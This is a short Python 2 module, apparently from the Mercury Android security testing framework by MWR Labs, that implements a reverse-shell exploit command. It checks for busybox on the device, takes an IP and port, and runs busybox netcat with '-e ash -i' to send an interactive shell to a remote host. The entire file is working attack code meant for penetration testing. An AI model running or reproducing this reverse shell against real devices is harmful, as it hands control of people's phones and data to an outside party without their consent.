import argparse, shlex

from merc.lib.modules import Module

class ReverseShell(Module):
    """Description: Get a reverse shell
Credit: Tyrone Erasmus - MWR Labs"""

    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "shell"]

    def execute(self, session, arg):

        # Check if busybox exists
        if session.executeCommand("core", "fileSize", {'path':'/data/data/com.mwr.mercury/busybox'}).isError():
            print "\nRun setup.busybox first and then retry\n"
            return

        # Check if no argument came in
        if not arg:
            print "\nusage: run exploit.shell.reverse_shell -a \"ip port\"\n"
            return

        # Define command-line arguments using argparse
        parser = argparse.ArgumentParser(prog = 'reverse_shell', add_help = False)
        parser.add_argument('ip')
        parser.add_argument('port')

        try:

            # Split arguments using shlex - this means that parameters with spaces can be used - escape " characters inside with \
            splitargs = parser.parse_args(shlex.split(arg))

            request = {}
            request['args'] = "/data/data/com.mwr.mercury/busybox nc " + splitargs.ip + " " + splitargs.port + " -e /data/data/com.mwr.mercury/busybox ash -i"

            response = session.executeCommand("shell", "executeSingleCommand", request)

            if response.isError():
                print "\nAn error occurred: " + response.error + "\n"

        # FIXME: Choose specific exceptions to catch
        except:
            pass
